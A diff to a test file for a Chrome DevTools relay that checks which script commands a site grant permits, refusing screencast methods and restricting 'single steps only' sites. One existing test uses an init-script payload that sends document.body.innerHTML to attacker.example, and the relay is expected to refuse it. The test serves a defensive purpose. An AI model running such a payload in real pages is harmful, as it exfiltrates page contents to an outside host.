@@ -1,7 +1,7 @@
 import { describe, expect, it } from 'bun:test';
-import { relayRunCommand, relayRunEvent, type RelayRunTab } from '../src/commands.js';
+import { relayRunCommand, relayRunEvent, runSites, type RelayRunTab, type TabUrls } from '../src/commands.js';
 
-const tab: RelayRunTab = { grant: { origins: ['app.example', '*.docs.example'] }, targetId: 'target', session: 'session', sessionId: 'session', addedBy: 'you' };
+const tab: RelayRunTab = { grant: { origins: ['app.example', '*.docs.example'] }, stepsOnly: [], urls: { tabUrl: 'https://app.example/' }, targetId: 'target', session: 'session', sessionId: 'session', addedBy: 'you' };
 
 describe('script commands on your Chrome', () => {
   it.each([
@@ -59,10 +59,54 @@ describe('script commands on your Chrome', () => {
     expect(relayRunCommand('Target.closeTarget', { targetId: 'other' }, { ...tab, addedBy: 'agent' })).toHaveProperty('refused');
   });
 
+  it.each(['Page.startScreencast', 'Page.stopScreencast', 'Page.screencastFrameAck'])('refuses %s: the screencast that keeps a background tab painting is the extension’s', method => {
+    expect(relayRunCommand(method, {}, tab)).toHaveProperty('refused');
+  });
+
   it('keeps init scripts and universal access off sites outside the grant', () => {
     expect(relayRunCommand('Page.addScriptToEvaluateOnNewDocument', { source: '', worldName: 'utility' }, tab)).toHaveProperty('send');
     expect(relayRunCommand('Page.addScriptToEvaluateOnNewDocument', { source: 'fetch("https://attacker.example/?" + document.body.innerHTML)' }, tab)).toHaveProperty('refused');
     expect(relayRunCommand('Page.createIsolatedWorld', { frameId: 'main', worldName: 'utility', grantUniveralAccess: true }, tab)).toEqual({ send: { frameId: 'main', worldName: 'utility', grantUniveralAccess: false } });
+  });
+});
+
+describe('the sites of one script', () => {
+  // admin.docs.example allows single steps only, though *.docs.example, which allows scripts, covers it too.
+  const grant = { origins: ['app.example', '*.docs.example', 'bank.example', 'admin.docs.example'], stepsOnly: ['bank.example', 'admin.docs.example'] };
+  const scripted = (urls: TabUrls, sites?: string[]): RelayRunTab => ({ ...tab, grant: { origins: runSites(grant, sites) }, stepsOnly: grant.stepsOnly, urls });
+
+  it('are every site of the grant that allows scripts, or exactly those the script names', () => {
+    expect(runSites(grant, undefined)).toEqual(['app.example', '*.docs.example']);
+    expect(runSites(grant, ['*.docs.example'])).toEqual(['*.docs.example']);
+  });
+
+  it('never include a site the grant lacks or one that allows single steps only', () => {
+    expect(() => runSites(grant, ['app.example', 'mail.example'])).toThrow('mail.example is not a site of this workspace group');
+    expect(() => runSites(grant, ['admin.docs.example'])).toThrow('admin.docs.example allows single steps only, not scripts');
+  });
+
+  it.each([
+    [{ tabUrl: 'https://bank.example/' }, 'bank.example'],
+    [{ tabUrl: 'https://admin.docs.example/users' }, 'admin.docs.example'],
+    [{ tabUrl: 'https://app.example/', pendingUrl: 'https://bank.example/' }, 'bank.example'],
+  ])('answers nothing but Target.getTargetInfo on a tab at %o', (urls, site) => {
+    for (const method of ['Runtime.evaluate', 'Target.attachToTarget', 'Page.bringToFront', 'Input.dispatchMouseEvent']) expect(relayRunCommand(method, { targetId: 'target' }, scripted(urls))).toEqual({ refused: `${site} allows single steps only, not scripts` });
+    expect(relayRunCommand('Target.getTargetInfo', { targetId: 'target' }, scripted(urls))).toEqual({ send: { targetId: 'target' } });
+  });
+
+  it('refuses navigating to a site that allows single steps only, even under a pattern that allows scripts', () => {
+    expect(relayRunCommand('Page.navigate', { url: 'https://admin.docs.example/' }, scripted({ tabUrl: 'https://app.example/' }))).toEqual({ refused: 'admin.docs.example allows single steps only, not scripts' });
+    expect(relayRunCommand('Page.navigate', { url: 'https://bank.example/' }, scripted({ tabUrl: 'https://app.example/' }))).toEqual({ refused: 'bank.example allows single steps only, not scripts' });
+    expect(relayRunCommand('Page.navigate', { url: 'https://help.docs.example/' }, scripted({ tabUrl: 'https://app.example/' }))).toHaveProperty('send');
+  });
+
+  it('keep a script that names sites to their tabs and pages', () => {
+    const onDocs = scripted({ tabUrl: 'https://help.docs.example/' }, ['app.example']);
+    expect(relayRunCommand('Runtime.evaluate', { expression: 'document.body.innerText' }, onDocs)).toEqual({ refused: 'This tab is outside the sites of this script' });
+    const onApp = scripted({ tabUrl: 'https://app.example/' }, ['app.example']);
+    expect(relayRunCommand('Runtime.evaluate', { expression: '1' }, onApp)).toEqual({ send: { expression: '1' } });
+    expect(relayRunCommand('Page.navigate', { url: 'https://help.docs.example/' }, onApp)).toEqual({ refused: 'https://help.docs.example/ is outside the sites of this script' });
+    expect(relayRunCommand('Page.navigate', { url: 'https://app.example/next' }, onApp)).toHaveProperty('send');
   });
 });
 
@@ -85,6 +129,10 @@ describe('script events from your Chrome', () => {
     });
     expect(JSON.stringify(relayRunEvent('Network.webSocketWillSendHandshakeRequest', { requestId: '2', request: { headers: { Cookie: 'session=secret', Origin: 'https://app.example' } } }))).not.toContain('secret');
     expect(relayRunEvent('Network.responseReceived', { requestId: '1', hasExtraInfo: true, response: { status: 200, headers: { 'Content-Type': 'text/html' } } })).toEqual({ requestId: '1', hasExtraInfo: false, response: { status: 200, headers: { 'Content-Type': 'text/html' } } });
+  });
+
+  it("keeps the extension's screencast frames from the script, which would acknowledge each one over the relay", () => {
+    expect(relayRunEvent('Page.screencastFrame', { data: 'AA==', sessionId: 1, metadata: {} })).toBeNull();
   });
 
   it('forwards other events unchanged', () => {
